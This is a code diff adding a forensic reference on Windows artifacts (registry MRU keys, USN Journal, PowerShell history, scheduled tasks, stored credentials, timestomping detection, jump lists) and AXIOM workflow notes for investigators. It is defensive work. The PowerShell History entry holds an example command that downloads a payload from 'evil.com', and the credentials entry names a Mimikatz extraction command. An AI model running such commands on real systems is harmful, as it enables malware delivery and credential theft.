@@ -2092,3 +2092,275 @@ export const triageChecklist = [
     'Label all media with case number, date, examiner',
   ]},
 ]
+// ─── Axiom Artifact Reference additions ──────────────────────────────────────
+// Sourced from Magnet Forensics Axiom Artifact Reference 6.8.0
+
+export interface AxiomArtifact {
+  name: string
+  category: string
+  axiomCategory: string
+  description: string
+  recoveryMethod: string
+  registryPath?: string
+  filePath?: string
+  attributes: { field: string; description: string; ciValue: string }[]
+  ciRelevance: string
+  axiomNotes: string
+  parseWith: string
+}
+
+export const axiomArtifacts: AxiomArtifact[] = [
+
+  // ── MRU: Folder Access ──────────────────────────────────────────────────────
+  {
+    name: 'MRU Folder Access',
+    category: 'MRU / Recent',
+    axiomCategory: 'File System',
+    description: 'Records folders accessed by applications using Windows Open/Save dialog boxes. Stored per application — shows which app opened which directory via dialog, with ordering to reconstruct recency.',
+    recoveryMethod: 'Parsing',
+    registryPath: 'NTUSER.DAT → Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\LastVisitedPidlMRU\n(Windows XP: LastVisitedMRU)',
+    attributes: [
+      { field: 'Application Name', description: 'The application that was used to open a folder via dialog', ciValue: 'Identifies which program the user was operating when they navigated to a sensitive directory. "WinRAR opened C:\\Exfil\\" = user was archiving files from that path.' },
+      { field: 'Folder Accessed', description: 'Full path to the folder accessed via Open/Save dialog', ciValue: 'Direct proof of directory navigation. Subject accessed C:\\Budget\\Confidential\\ via Excel = deliberate targeting of that folder.' },
+      { field: 'Registry Key Modified Date/Time', description: 'Last write time of the MRU registry key', ciValue: 'Upper bound timestamp for when this folder was last accessed. Useful for timeline anchoring.' },
+      { field: 'Registry Order', description: 'Ordinal recency order — value of 1 = most recently accessed folder for that application', ciValue: 'Reconstruct chronological order of folder access when timestamps are absent or insufficient.' },
+      { field: 'Value Name', description: 'Registry value name associated with the record', ciValue: 'Internal identifier — useful for correlating entries across registry exports.' },
+    ],
+    ciRelevance: 'Proves which folders a user deliberately navigated to via dialog boxes — strong evidence of intentional access to specific directories. Particularly valuable when combined with USB artifacts (folder was on removable media) or network shares. The application name links the folder access to specific user activity (e.g., 7-Zip opening an external drive folder = archiving activity).',
+    axiomNotes: 'PIDL format on Windows Vista+ may contain GUIDs instead of readable path strings for known folders (Desktop, Documents, etc.). AXIOM resolves GUIDs to human-readable paths. For Windows XP, the key name is LastVisitedMRU. Cross-reference with MRU Opened/Saved Files for the specific files within the accessed folders.',
+    parseWith: 'Magnet AXIOM, RegRipper (comdlg32.pl plugin), RECmd (MRU batch), X-Ways Forensics',
+  },
+
+  // ── MRU: Opened/Saved Files ─────────────────────────────────────────────────
+  {
+    name: 'MRU Opened/Saved Files',
+    category: 'MRU / Recent',
+    axiomCategory: 'File System',
+    description: 'Records specific files opened or saved through any application\'s Windows Open/Save File dialog. More specific than Folder Access — captures individual filenames and paths with recency ordering.',
+    recoveryMethod: 'Parsing',
+    registryPath: 'NTUSER.DAT → Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\OpenSavePidlMRU\\<extension subkey>\n(Windows XP: OpenSaveMRU)',
+    attributes: [
+      { field: 'File Name', description: 'Name of the file accessed via Open/Save dialog', ciValue: 'Directly names the file the user interacted with. "report_confidential_final.docx" accessed = deliberate file interaction.' },
+      { field: 'File Path', description: 'Full path to the file', ciValue: 'Complete location — identifies source (local drive, external drive by volume letter, network share by UNC path).' },
+      { field: 'Registry Key Modified Date/Time', description: 'Last write time of the MRU key', ciValue: 'Timestamp upper bound for when this file was accessed via dialog.' },
+      { field: 'Registry Order', description: 'Recency order — 1 = most recently accessed', ciValue: 'Reconstruct order of file access when multiple files present.' },
+    ],
+    ciRelevance: 'Shows files directly interacted with via application dialog — stronger than LNK files because it requires the user to navigate an Open/Save dialog to access the file. Subkeys are organized by file extension, enabling targeted searches (e.g., all .xlsx files opened). Volume letter in path can indicate external drive access — cross-reference with USB artifacts for drive serial correlation.',
+    axiomNotes: 'Subkeys under OpenSavePidlMRU are organized by file extension (e.g., .docx, .xlsx, .zip). The \'*\' subkey contains the most recently accessed files regardless of extension — most forensically useful. Paths use PIDL encoding on Vista+ — AXIOM decodes these. For Windows XP the key is OpenSaveMRU and paths are in plain text.',
+    parseWith: 'Magnet AXIOM, RegRipper (comdlg32.pl), RECmd, X-Ways Forensics',
+  },
+
+  // ── MRU: Recent Files and Folders ───────────────────────────────────────────
+  {
+    name: 'MRU Recent Files and Folders',
+    category: 'MRU / Recent',
+    axiomCategory: 'File System',
+    description: 'Windows RecentDocs registry key — tracks files and folders recently opened or saved, correlated with LNK files in the Recent folder. Organized by file extension subkeys plus a top-level recent list.',
+    recoveryMethod: 'Parsing',
+    registryPath: 'NTUSER.DAT → Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs',
+    filePath: '%APPDATA%\\Microsoft\\Windows\\Recent\\*.lnk (correlated LNK files)',
+    attributes: [
+      { field: 'File/Folder Name', description: 'Name of the recently accessed file or folder', ciValue: 'Most recently accessed files — direct evidence of interaction.' },
+      { field: 'File/Folder Link', description: 'Associated LNK shortcut filename in the Recent folder', ciValue: 'Links this MRU entry to a specific LNK file — enables cross-referencing with LNK timestamps, volume serial number, and MAC address.' },
+      { field: 'Registry Key Modified Date/Time', description: 'Last write time of the RecentDocs key', ciValue: 'Timestamp when this entry was last updated — corroborates LNK timestamps.' },
+      { field: 'Registry Order', description: 'Recency ordering — 1 = most recently accessed', ciValue: 'Reconstruct file access timeline order when timestamps alone are insufficient.' },
+    ],
+    ciRelevance: 'Complements LNK file analysis — provides the registry-side view of recent file access while LNK files provide the shell-side view. Both should agree on recently accessed files. Discrepancy between RecentDocs and LNK timestamps can indicate timestamp manipulation. Extension subkeys reveal what file types the subject was working with (e.g., heavy .rar activity alongside sensitive document access).',
+    axiomNotes: 'RecentDocs is organized by file extension subkeys similar to OpenSavePidlMRU. The root key contains MRU data for all types. Subkeys (e.g., .docx, .pdf, .zip) contain type-specific recent files. Cross-reference with the %APPDATA%\\Microsoft\\Windows\\Recent\\ LNK files for complete picture. The MRUListEx value encodes the recency order as an array of DWORD indices.',
+    parseWith: 'Magnet AXIOM, RegRipper (recentdocs.pl), RECmd, Autopsy (Recent Documents module)',
+  },
+
+  // ── USN Journal ─────────────────────────────────────────────────────────────
+  {
+    name: 'USN Journal ($UsnJrnl:$J)',
+    category: 'NTFS',
+    axiomCategory: 'File System',
+    description: 'The Update Sequence Number Journal records every file system change on NTFS volumes — file creation, modification, deletion, rename, attribute change. Each record includes the type of change (reason flags) at 100-nanosecond timestamp precision. Primary tool for proving deletion of evidence and reconstructing file system activity.',
+    recoveryMethod: 'Parsing',
+    filePath: 'C:\\$Extend\\$UsnJrnl:$J (alternate data stream)\nExtract: fsutil usn readjournal C: > usn_dump.txt',
+    attributes: [
+      { field: 'File Name', description: 'Name of the file or directory that changed', ciValue: 'Proves a named file existed and was acted upon at a specific time.' },
+      { field: 'Update Sequence Number', description: 'Monotonically increasing sequence number — higher USN = later in time', ciValue: 'Establishes relative ordering of events when timestamps alone are ambiguous.' },
+      { field: 'Timestamp Date/Time', description: '100-nanosecond precision UTC timestamp of the change', ciValue: 'Sub-second precision for precise timeline reconstruction.' },
+      { field: 'Reason', description: 'Bitmask of what changed — see reason flags below', ciValue: 'Distinguishes overwrite from truncation from rename from deletion. Critical for proving type of file modification.' },
+      { field: 'MFT Record Number', description: 'MFT entry for the changed file', ciValue: 'Cross-reference with MFT for full file metadata. Stable identifier even after file rename.' },
+      { field: 'Parent MFT Record Number', description: 'MFT entry of the parent directory', ciValue: 'Identifies which directory the file was in — critical for files that were moved or renamed.' },
+      { field: 'File Attributes', description: 'NTFS attribute flags at time of change', ciValue: 'Hidden, System, Encrypted flags at time of event.' },
+      { field: 'Source Information', description: 'Supplemental source info for the change', ciValue: 'Identifies if change was from data management or replication — helps distinguish normal OS activity from user/tool activity.' },
+      { field: 'Security ID', description: 'Security identifier assigned to the file at time of change', ciValue: 'User context of the change when combined with SAM/AD lookup.' },
+    ],
+    ciRelevance: 'Primary artifact for proving file deletion, renaming (anti-forensics tool SDelete renames to ZZZ... before deleting — visible in USN Journal), and staged exfiltration (copy → compress → delete sequence visible in reason flags). Retention period is volume-dependent (typically last ~30–70 MB of change history). Journal survives file deletion — proves files existed and were deleted even after MFT entries are overwritten. Key reason flags for CI: FILE_DELETE (0x200), FILE_CREATE (0x100), RENAME_OLD_NAME (0x1000), RENAME_NEW_NAME (0x2000), DATA_OVERWRITE (0x1), DATA_EXTEND (0x2), DATA_TRUNCATION (0x4).',
+    axiomNotes: 'AXIOM parses $UsnJrnl:$J and presents reason flags as human-readable strings. The reason field can contain multiple flags ORed together — a single USN record can show both DATA_EXTEND and DATA_OVERWRITE simultaneously. Journal size is set in the NTFS volume metadata — default ~32 MB on most systems, configurable. Extract with ANJP (ArtifactAnalyzer Journal Parser), MFTECmd -f $J, or KAPE with $J target.',
+    parseWith: 'Magnet AXIOM, MFTECmd.exe (EZ Tools) -f $J, ANJP (ArtifactAnalyzer Journal Parser), X-Ways Forensics',
+  },
+
+  // ── PowerShell History ───────────────────────────────────────────────────────
+  {
+    name: 'PowerShell History',
+    category: 'Execution',
+    axiomCategory: 'OS Artifacts',
+    description: 'PSReadLine command history — plaintext log of all PowerShell commands entered at the interactive prompt. Persists across sessions. One of the most overlooked high-value artifacts in Windows IR — commands are stored exactly as typed including arguments, paths, and inline credentials.',
+    recoveryMethod: 'Parsing',
+    filePath: '%APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\n(Per-user, per-host — also check PowerShell_ISE_history.txt for ISE)',
+    attributes: [
+      { field: 'User Name', description: 'The user account whose profile contains the history file', ciValue: 'Attributes commands to specific user account.' },
+      { field: 'Command', description: 'The exact PowerShell command as typed, including all arguments', ciValue: 'Full command fidelity — captures paths, flags, remote targets, and inline credentials. "Invoke-WebRequest http://evil.com/payload.exe -OutFile C:\\Users\\Public\\p.exe" = download evidence.' },
+    ],
+    ciRelevance: 'PSReadLine history is not cleared by "Clear-History" (which only clears the in-session history, not the file). Only manual deletion of ConsoleHost_history.txt or setting MaximumHistoryCount to 0 suppresses it — and deletion itself is detectable via $UsnJrnl and MFT. Commands show exact tools run, targets accessed, and data staged. Key indicators: Compress-Archive, Invoke-WebRequest/iwr/wget, Start-BitsTransfer, net use, Copy-Item to/from external paths, base64 encoded commands (-EncodedCommand), Set-ExecutionPolicy Bypass, IEX (Invoke-Expression), DownloadString.',
+    axiomNotes: 'Default maximum history is 4096 entries (configurable in $PROFILE). The file is plain UTF-8 text — one command per line. ISE has a separate history file. PowerShell 2.0 (PSReadLine not present) uses a different mechanism — check event log (Event ID 4103/4104 with Script Block Logging enabled). Transcript files (if Start-Transcript was run) provide even more complete history including output.',
+    parseWith: 'Magnet AXIOM, direct file read (cat/type), KAPE (PowerShellHistory target)',
+  },
+
+  // ── Scheduled Tasks ─────────────────────────────────────────────────────────
+  {
+    name: 'Scheduled Tasks',
+    category: 'Persistence',
+    axiomCategory: 'OS Artifacts',
+    description: 'Windows Task Scheduler task definitions — configured automated tasks with command, trigger, schedule, author, RunAs account, and privilege level. Primary persistence mechanism for malware and a key artifact in both incident response and CI investigations for establishing unauthorized persistence.',
+    recoveryMethod: 'Parsing',
+    filePath: 'C:\\Windows\\System32\\Tasks\\ (XML task definitions)\nC:\\Windows\\SysWOW64\\Tasks\\ (32-bit tasks)\nRegistry: HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks',
+    attributes: [
+      { field: 'Name', description: 'Display name of the scheduled task', ciValue: 'Malware often uses legitimate-sounding names (e.g., "WindowsDefenderUpdate", "AdobeFlashUpdater"). Unfamiliar task names warrant investigation.' },
+      { field: 'Command', description: 'Full path to the executable and any arguments', ciValue: 'What actually runs — script interpreters (powershell.exe, wscript.exe, mshta.exe, cscript.exe) executing from temp/user directories are high-priority indicators.' },
+      { field: 'Author', description: 'Person or process that created the task', ciValue: 'Legitimate Microsoft tasks list Microsoft as author. Tasks authored by domain users or with empty author field are suspicious.' },
+      { field: 'Created Date/Time', description: 'Local time when the task was created (not UTC in AXIOM output)', ciValue: 'Establish when persistence was installed — correlate with other timeline artifacts for initial access timeframe.' },
+      { field: 'Run As', description: 'User account the task runs under', ciValue: 'SYSTEM-level tasks from non-Microsoft authors are critical findings. User-context tasks can still be harmful if the user is a local admin.' },
+      { field: 'Last Run Date/Time', description: 'Most recent execution of the task', ciValue: 'Proves the task has actively executed — not just installed.' },
+      { field: 'Privilege Level', description: 'LeastPrivilege or HighestAvailable', ciValue: 'HighestAvailable = runs with maximum user privileges. Combined with SYSTEM RunAs = unrestricted access.' },
+      { field: 'Hidden', description: 'Boolean — whether task is hidden from Task Scheduler UI', ciValue: 'Hidden=True is a strong malware indicator. Legitimate scheduled tasks are rarely hidden.' },
+      { field: 'Triggers', description: 'Conditions that cause the task to execute', ciValue: 'ONLOGON, ONSYSTEMSTART, and repetition triggers (every 5 minutes) are persistence-oriented. One-time triggers may indicate staged execution.' },
+      { field: 'Actions', description: 'Operations performed when triggered', ciValue: 'Multiple actions in sequence = multi-stage execution chain. Actions executing scripts from %TEMP% or user-writable directories are suspicious.' },
+      { field: 'Status', description: 'Ready or Disabled at time of recovery', ciValue: 'Disabled tasks may indicate a defender paused the task — or the attacker disabled it to avoid detection after it fired.' },
+    ],
+    ciRelevance: 'Scheduled tasks are the second most common persistence mechanism after registry run keys. Key forensic questions: (1) Does this task have a legitimate author and path? (2) Does the task command reference temp/user-writable directories? (3) Was the task created near the time of suspected initial access? (4) Does the task execute script interpreters (PowerShell, WScript, MSHTA) rather than standalone executables? The XML task definition file contains all attributes and is recoverable from C:\\Windows\\System32\\Tasks\\ even if the task has been deleted (via $UsnJrnl and unallocated space carving).',
+    axiomNotes: 'AXIOM parses both the XML task definition files and the registry TaskCache. The File field in AXIOM contains the raw XML — useful for full trigger/action inspection. Task files in C:\\Windows\\System32\\Tasks\\ are XML and can be read directly. Deleted task files may be recovered from $UsnJrnl (deletion record) and unallocated space. Cross-reference task creation time with Event ID 4698 (Scheduled Task Created) in Security event log.',
+    parseWith: 'Magnet AXIOM, KAPE (ScheduledTasks target), schtasks.exe /query /fo LIST /v (live), X-Ways Forensics, RegRipper (taskCache.pl)',
+  },
+
+  // ── Windows Stored Credentials ──────────────────────────────────────────────
+  {
+    name: 'Windows Stored Credentials',
+    category: 'Credentials',
+    axiomCategory: 'OS Artifacts',
+    description: 'Recovers and decrypts stored credentials from Windows Credential Manager for local (non-domain) users. Includes saved passwords for network resources, websites (via Windows Vault), and applications that use CredMan API. AXIOM decrypts these using DPAPI with the user\'s password.',
+    recoveryMethod: 'Parsing',
+    filePath: '%APPDATA%\\Microsoft\\Credentials\\ (DPAPI encrypted blob files)\n%LOCALAPPDATA%\\Microsoft\\Credentials\\\nRegistry: HKCU\\Software\\Microsoft\\Protected Storage System Provider\n(Legacy IE credentials)',
+    attributes: [
+      { field: 'Entry ID', description: 'Unique name/identifier for the credential entry', ciValue: 'Target resource name — identifies what system or service the credential provides access to.' },
+      { field: 'Description', description: 'Human-readable description of the credential', ciValue: 'May reveal target system type or purpose.' },
+      { field: 'User Name', description: 'Username stored with the credential', ciValue: 'Identifies accounts the subject has stored access to — may reveal alternate identities or shared accounts.' },
+      { field: 'Password', description: 'Decrypted password (non-domain users only in AXIOM)', ciValue: 'Actual credential — proves stored access to target system. Valuable for understanding scope of access and potential lateral movement.' },
+      { field: 'Target Service', description: 'The service or resource the credential is for', ciValue: 'Reveals what systems the user had saved credentials to — network shares, VPNs, remote systems.' },
+      { field: 'Type', description: 'Credential type (Generic, Domain Password, Domain Certificate, etc.)', ciValue: 'Domain credentials can enable lateral movement if cracked/extracted.' },
+      { field: 'Persistence Level', description: 'Local machine, logon session, or enterprise level', ciValue: 'Enterprise-level credentials are domain-wide — highest value for lateral movement analysis.' },
+      { field: 'File Path', description: 'Path to the DPAPI blob file containing this credential', ciValue: 'Enables correlation with DPAPI master key for manual decryption if needed.' },
+    ],
+    ciRelevance: 'Stored credentials reveal access scope — what systems can the subject authenticate to without typing a password? Critical for: (1) identifying saved credentials for cloud storage (OneDrive, Dropbox, Box) that corroborate exfiltration paths; (2) discovering saved credentials for network shares that may contain sensitive data; (3) finding alternate account credentials stored on the device. DPAPI decryption requires the user\'s current password or the DPAPI master key — AXIOM handles this automatically when analyzing a live image with known credentials.',
+    axiomNotes: 'AXIOM decrypts Windows Credential Manager entries for non-domain users using DPAPI. Domain user DPAPI keys are protected by the domain\'s DPAPI backup key — requires domain controller access or Mimikatz-style extraction for offline decryption. Credential Manager entries are stored as encrypted DPAPI blobs in %APPDATA%\\Microsoft\\Credentials\\. The cmdkey /list command (live system) shows available credentials without decrypting passwords. Cross-reference with LSA Secrets for service account credentials.',
+    parseWith: 'Magnet AXIOM (automated DPAPI decryption), Mimikatz sekurlsa::dpapi (live), impacket-dpapi (offline with master key), X-Ways Forensics',
+  },
+
+  // ── OS Information (Last Shutdown) ──────────────────────────────────────────
+  {
+    name: 'Operating System Information',
+    category: 'System',
+    axiomCategory: 'OS Artifacts',
+    description: 'Windows installation metadata from the registry — includes last shutdown time, OS version, build number, computer name, domain, product key, and whether Last Access Time timestamps are enabled. The last shutdown time is a critical timeline anchor for forensic analysis.',
+    recoveryMethod: 'Parsing',
+    registryPath: 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\Windows (ShutdownTime)\nHKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion (OS version, build, product key)\nHKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters (computer name, domain)\nHKLM\\SYSTEM\\CurrentControlSet\\Control\\FileSystem (NtfsDisableLastAccessUpdate)',
+    attributes: [
+      { field: 'Last Shutdown Date/Time', description: 'UTC timestamp of last clean Windows shutdown from ShutdownTime registry value', ciValue: 'Timeline anchor — establishes latest possible time for artifacts captured before shutdown. Combined with Event ID 6006 (event log service stopped) for cross-validation. Abnormally early shutdown may indicate device was seized or powered off to stop an ongoing process.' },
+      { field: 'Operating System / Version Number / Build Number', description: 'OS name, version string, and specific build number', ciValue: 'Determines applicable vulnerability surface and artifact locations. Build number identifies specific Windows 10/11 feature update.' },
+      { field: 'Computer Name / Displayed Computer Name', description: 'System hostname — registry value vs displayed name may differ if recently changed', ciValue: 'Discrepancy between the two values proves computer was renamed — may indicate name change after incident to obscure forensic correlation.' },
+      { field: 'Domain', description: 'Domain the computer is currently connected to', ciValue: 'Establishes corporate vs standalone context. Cross-reference with user accounts for domain vs local account usage.' },
+      { field: 'Last Access Time Enabled', description: 'Whether NTFS Last Access Time timestamps are updated (Yes/No)', ciValue: 'If No — Last Access Time cannot be used as evidence of file access. Windows 10 disables Last Access Time by default. This field explicitly documents whether that timestamp type is reliable for this system.' },
+      { field: 'Product Key', description: 'Windows license key', ciValue: 'Identifies legitimate vs pirated installation. Volume license keys reveal corporate licensing.' },
+      { field: 'Last Service Pack', description: 'Patch level at time of image', ciValue: 'Determines applicable unpatched vulnerabilities at time of incident.' },
+    ],
+    ciRelevance: 'The Last Shutdown Time is the most forensically significant field — it anchors the entire artifact timeline. All NTFS timestamps, Prefetch last run times, and event log entries must predate this value. An unexpected shutdown time (e.g., middle of business day) may indicate the system was powered down deliberately. The Last Access Time Enabled field explicitly documents whether file access timestamps are reliable for this specific system — critical for testimony accuracy.',
+    axiomNotes: 'AXIOM recovers ShutdownTime from HKLM\\SYSTEM and compares across multiple control sets, using the most recent value. The displayed computer name updates on every reboot — if it differs from the stored computer name, the name was changed since last boot. NtfsDisableLastAccessUpdate value: 0 = Last Access Time enabled, 1 = disabled (default on Windows 10). This field directly affects the evidentiary value of Last Access Time on any artifact recovered from this system.',
+    parseWith: 'Magnet AXIOM, RegRipper (shutdown.pl, winnt_cv.pl), RECmd, Autopsy (Recent Activity module)',
+  },
+
+  // ── NTFS Timestamp Mismatch (Axiom-specific detection) ──────────────────────
+  {
+    name: 'NTFS Timestamp Mismatch (Axiom detection)',
+    category: 'Anti-forensics',
+    axiomCategory: 'File System',
+    description: 'AXIOM\'s automated timestomping detection — flags files where $STANDARD_INFORMATION (0x10) timestamps are older than or inconsistent with $FILE_NAME (0x30) timestamps, or where all three primary timestamps have milliseconds set to zero. Requires ALL THREE timestamp pairs (Created, Modified, MFT Modified) to mismatch to produce a hit — reduces false positives.',
+    recoveryMethod: 'Parsing ($MFT analysis)',
+    filePath: 'C:\\$MFT (analyzed internally)',
+    attributes: [
+      { field: 'File Name', description: 'The flagged file', ciValue: 'The specific file with manipulated timestamps.' },
+      { field: 'MFT Record Number', description: 'Stable identifier for the file in the MFT', ciValue: 'Cross-reference with other MFT-based artifacts even after file rename.' },
+      { field: 'Standard_Information Created / File_Name Created', description: '$SI vs $FN created timestamp pair', ciValue: 'If $SI Created is older than $FN Created — impossible without external manipulation. $FN timestamps updated by NTFS kernel, $SI by user-mode code.' },
+      { field: 'Standard_Information Modified / File_Name Modified', description: '$SI vs $FN modified timestamp pair', ciValue: 'Same diagnostic value — mismatch proves $SI was manipulated.' },
+      { field: 'Standard_Information Accessed / File_Name Accessed', description: '$SI vs $FN accessed timestamp pair', ciValue: 'Third consistency check.' },
+      { field: 'Standard_Information MFT Modified / File_Name MFT Modified', description: '$SI vs $FN MFT modification pair', ciValue: 'MFT Modified timestamp should reflect when the MFT entry itself changed.' },
+      { field: 'Reason', description: 'Why this file was flagged: timestamp order violation, zero milliseconds, or both', ciValue: 'Zero milliseconds across all four $SI timestamps = strong timestomping indicator (many tools set timestamps to exact second, zeroing the sub-second component). Axiom documents exactly which criteria triggered the flag.' },
+    ],
+    ciRelevance: 'AXIOM\'s threshold (all three timestamp pairs must be inconsistent) is conservative — reduces false positives from legitimate software behavior. A flagged file means AXIOM detected a statistically improbable pattern requiring external manipulation. Key forensic question: what tool was used to stomp these timestamps? Cross-reference with Prefetch (what tools ran before the timestomping), $UsnJrnl (what changes were made to this file), and ShimCache/Amcache (execution evidence for known timestomping tools like Timestomp, BulkFileChanger, touch).',
+    axiomNotes: 'AXIOM\'s detection logic: (1) $SI timestamps predate $FN timestamps AND (2) milliseconds are zero on all $SI timestamps. Both conditions must be present across all three timestamp types (Created, Modified, MFT Modified). This is more conservative than MFTECmd\'s output which shows all $SI/$FN pairs — AXIOM filters to high-confidence hits only. For complete MFT timestamp analysis, use MFTECmd.exe which exports all $SI and $FN timestamps for every file, allowing manual comparison across the full volume.',
+    parseWith: 'Magnet AXIOM (automated detection), MFTECmd.exe (full MFT with both $SI and $FN attributes), X-Ways Forensics (MFT browser with timestamp columns)',
+  },
+
+  // ── Jump List (Axiom field additions) ────────────────────────────────────────
+  {
+    name: 'Jump List (additional fields)',
+    category: 'Execution / Recent',
+    axiomCategory: 'File System',
+    description: 'AXIOM\'s Jump List parsing includes fields not commonly highlighted in basic analysis — specifically the Target MAC Address (links shortcut to a specific volume/device), Target NetBIOS Name (source machine), Pin Status, and Access Count. These add significant evidentiary value beyond what basic LNK parsers provide.',
+    recoveryMethod: 'Parsing',
+    filePath: '%APPDATA%\\Microsoft\\Windows\\Recent\\AutomaticDestinations\\*.automaticDestinations-ms\n%APPDATA%\\Microsoft\\Windows\\Recent\\CustomDestinations\\*.customDestinations-ms',
+    attributes: [
+      { field: 'App ID', description: 'Unique application identifier generated by Windows from install path', ciValue: 'Cross-reference with known App ID database (EZTools JumpList App IDs) to identify the source application even when name is unknown.' },
+      { field: 'Potential App Name', description: 'AXIOM\'s lookup of App ID against known application database', ciValue: 'Human-readable application name for the Jump List — directly identifies which program generated the entry.' },
+      { field: 'Target MAC Address', description: 'MAC address of the volume containing the target file', ciValue: 'Links the accessed file to a specific network adapter or storage device. If MAC matches a known network card, proves file was accessed over network. If MAC is for a removable drive controller, links to specific hardware.' },
+      { field: 'Target NetBIOS Name', description: 'Machine name on the network for the target file location', ciValue: 'If different from the local machine name — proves file was accessed from a remote system. Identifies the source server for network share access.' },
+      { field: 'Jump List Type', description: 'Automatic (OS-managed) or Custom (application-defined)', ciValue: 'Automatic lists are OS-maintained and harder to fake. Custom lists may be deliberately populated by applications and less reliable for timeline analysis.' },
+      { field: 'Pin Status', description: 'Whether the shortcut was pinned in the Dest List', ciValue: 'Pinned items indicate deliberate user action to keep a file accessible — stronger evidence of intentional use than automatic recent items.' },
+      { field: 'Access Count', description: 'Number of times a file was accessed through this Jump List', ciValue: 'High access count = habitual use, not one-time access. An access count of 1 could be accidental; 47 accesses to a file on an external drive is deliberate.' },
+    ],
+    ciRelevance: 'The Target MAC Address and NetBIOS Name fields are the most forensically distinctive additions — they can prove a file was accessed from a remote system or link a Jump List entry to a specific removable device by its controller MAC address. Combined with USB artifacts (device serial number and first/last connected times), this creates a device → file access linkage chain. The Access Count field quantifies frequency of use, which is directly relevant to intent arguments.',
+    axiomNotes: 'AXIOM combines Dest List entries (the .automaticDestinations-ms metadata section) and shortcut entries (the embedded LNK data within each Jump List) into a single unified table. The App ID lookup database is maintained by Eric Zimmerman\'s JumpList Explorer and the EZTools community. Jump List entries survive after the original file is deleted — the Jump List retains the record even when the target file no longer exists, preserving evidence of prior file access.',
+    parseWith: 'Magnet AXIOM, JumpList Explorer / JLECmd (EZ Tools), X-Ways Forensics, Autopsy (Recent Activity module)',
+  },
+]
+
+// ─── Axiom CI workflow notes ──────────────────────────────────────────────────
+
+export const axiomWorkflowNotes = [
+  {
+    topic: 'AXIOM processing order for CI investigations',
+    steps: [
+      'Create case → Add evidence → Enable ALL artifact categories (do not limit to "fast" categories)',
+      'Enable DPAPI decryption: Case Details → Decryption → enter user password if known (enables Stored Credentials, browser passwords, WiFi keys)',
+      'Run full processing — CI cases require comprehensive artifact extraction, not quick triage',
+      'After processing: Artifacts → Windows → File System → check MRU Folder Access, MRU Opened/Saved Files, Recycle Bin, Shellbags',
+      'Check SRUM tables: Artifacts → Windows → Application Usage → SRUM (all five tables)',
+      'Check execution evidence: Artifacts → Windows → Application Usage → Prefetch, UserAssist, SRUM Application Resource Usage',
+      'Check anti-forensics: Artifacts → Windows → File System → NTFS Timestamp Mismatch',
+      'Run Timeline: Artifacts → Timeline → filter by date range of incident window',
+      'Export findings: Reports → Portable Case (for sharing) or CSV (for timeline tools)',
+    ],
+  },
+  {
+    topic: 'AXIOM Timeline view for CI',
+    steps: [
+      'Timeline combines ALL artifact timestamps into a single chronological view',
+      'Filter by date/time range to focus on incident window',
+      'Use "Artifact Type" filter to isolate specific evidence types (e.g., only File System + Communication)',
+      'Tag key events as Evidence during review — builds a curated timeline for reporting',
+      'Export timeline as CSV → import into Excel or timeline visualization tools',
+      'Cross-reference SRUM timestamps (hourly granularity) with Prefetch timestamps (execution) for same executables',
+    ],
+  },
+  {
+    topic: 'AXIOM Connections for identity linking',
+    steps: [
+      'Connections tab visualizes relationships between artifacts (emails, contacts, accounts)',
+      'Useful for linking email addresses across browser history, stored credentials, and cloud storage artifacts',
+      'Export connection map as image for reports',
+    ],
+  },
+]
